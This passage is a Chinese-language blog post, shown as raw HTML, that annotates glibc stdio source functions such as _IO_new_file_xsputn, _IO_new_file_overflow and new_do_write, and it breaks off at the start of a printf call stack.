class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;       <span class="comment">//s是用户缓冲区</span></span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))   <span class="comment">//标志为当前为行缓冲模式且为写入状态</span></span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;   <span class="comment">//count是输入缓冲区的大小</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)            </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do) </span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);   <span class="comment">//直接拷贝数据(all or partial)</span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)                           <span class="comment">//刷新已满缓冲区</span></span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);    <span class="comment">//较大：对齐</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);      <span class="comment">//调用系统调用读取</span></span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);     <span class="comment">//剩余数据的写入：因为行缓冲模式较难实现</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure><p>我认为这个<code>_IO_new_file_xsputn</code>可以分为三个部分：</p><ul><li>首先是计算有多少可用空间</li><li>然后是填充缓冲区</li><li>之后刷新缓冲区，并写入数据</li><li>最后是对剩余数据的处理</li></ul><h3 id="计算可用空间部分"><a href="#计算可用空间部分" class="headerlink" title="计算可用空间部分"></a>计算可用空间部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;       <span class="comment">//s是用户缓冲区</span></span><br><span class="line"> <span class="type">size_t</span> to_do = n;</span><br><span class="line"> <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line"> <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">    If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">    (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line"> <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))   <span class="comment">//标志为当前为行缓冲模式且为写入状态</span></span><br><span class="line">   &#123;</span><br><span class="line">     count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;   <span class="comment">//count是输入缓冲区的大小</span></span><br><span class="line">     <span class="keyword">if</span> (count &gt;= n)            </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">   count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br></pre></td></tr></table></figure><p>其中会遍历缓冲区，如果有换行符就会+1，这是因为行缓冲区在遇到换行符或者缓冲区满了之后才会停止，只有+1才能保证换行符前面的数据都被写入，之后还会<code>must_flush</code>赋值为1</p><h3 id="填充缓冲区部分"><a href="#填充缓冲区部分" class="headerlink" title="填充缓冲区部分"></a>填充缓冲区部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line"> <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (count &gt; to_do) </span><br><span class="line">count = to_do;</span><br><span class="line">     f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);   <span class="comment">//直接拷贝数据(all or partial)</span></span><br><span class="line">     s += count;</span><br><span class="line">     to_do -= count;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这就很好理解了</p><h3 id="刷新缓冲区并写入部分"><a href="#刷新缓冲区并写入部分" class="headerlink" title="刷新缓冲区并写入部分"></a>刷新缓冲区并写入部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">     <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)                           <span class="comment">//刷新已满缓冲区</span></span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">     block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">     do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);    <span class="comment">//较大：对齐</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);      <span class="comment">//调用系统调用读取</span></span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果之前有赋值过<code>must_flush</code>又或者此时还有数据没写入，则会刷新缓冲区，然后如果缓冲区很大，则会对齐设置，之后便是调用<code>new_do_write</code>函数，而这个里面是调用了系统调用<code>_IO_SYSWRITE</code></p><h3 id="剩余数据的处理部分"><a href="#剩余数据的处理部分" class="headerlink" title="剩余数据的处理部分"></a>剩余数据的处理部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);     <span class="comment">//剩余数据的写入：因为行缓冲模式较难实现</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure><p>之后便是读入剩余数据，因为行缓冲区需要遇到换行符或者缓冲区满了才会写入，因此不好读取剩余的数据，就会调用<code>_IO_default_xsputn</code>来读取剩余数据，之后return就结束了</p><h3 id="IO-OVERFLOW"><a href="#IO-OVERFLOW" class="headerlink" title="_IO_OVERFLOW"></a>_IO_OVERFLOW</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><h3 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)   <span class="comment">//当前没有正在进行写入操作或者没有分配缓冲区</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);                                            <span class="comment">//初始化缓冲区</span></span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)               <span class="comment">//缓冲区满了就会刷新</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure><p>可以看到除了第50行刷新缓冲区的操作外，第11-45行的if操作是在<code>当前没有正在进行写入操作或者没有分配缓冲区</code>的前提下进行的，大概的功能是了解的，就不过多赘述，所以这段的主要功能便是检查加刷新缓冲区</p><h3 id="new-do-write"><a href="#new-do-write" class="headerlink" title="new_do_write"></a>new_do_write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)                 <span class="comment">//该文件是追加模式打开</span></span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span> </span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;       <span class="comment">//表明偏移不可预测</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)            <span class="comment">//如果不等，则说明还有数据未读取</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);        <span class="comment">//使用该调用，能让指针到正确位置，避免覆盖未读取数据</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);         <span class="comment">//真正读取数据</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);          <span class="comment">//重置读指针的位置</span></span><br><span class="line">   fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);                </span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要调用<code>_IO_SYSWRITE</code></p><h3 id="IO-new-file-write"><a href="#IO-new-file-write" class="headerlink" title="_IO_new_file_write"></a>_IO_new_file_write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_new_file_write (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">ssize_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">while</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">ssize_t</span> count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                                         &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">   ? __write_nocancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">   : __write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (<span class="type">void</span> *) ((<span class="type">char</span> *) data + count);</span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是调用<code>__write_nocancel</code>或<code>__write</code>来读取数据，想要仔细了解就去看源码吧，只能说是很底层的调用了</p><h3 id="IO-default-xsputn"><a href="#IO-default-xsputn" class="headerlink" title="_IO_default_xsputn"></a>_IO_default_xsputn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">    count = more;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="type">ssize_t</span> i;</span><br><span class="line">      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">*p++ = *s++;</span><br><span class="line">      f-&gt;_IO_write_ptr = p;</span><br><span class="line">    &#125;</span><br><span class="line">  more -= count;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure><p>这里有两种读取方式，也是比较好理解的这段源码，应该是为了性能最佳的考虑吧</p><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><p>调用栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>   <span class="number">0x7f6117fd43b0</span> write</span><br><span class="line">  f <span class="number">1</span>   <span class="number">0x7f6117f55c0f</span> _IO_file_write+<span class="number">143</span></span><br><span class="line">  f <span class="number">2</span>   <span 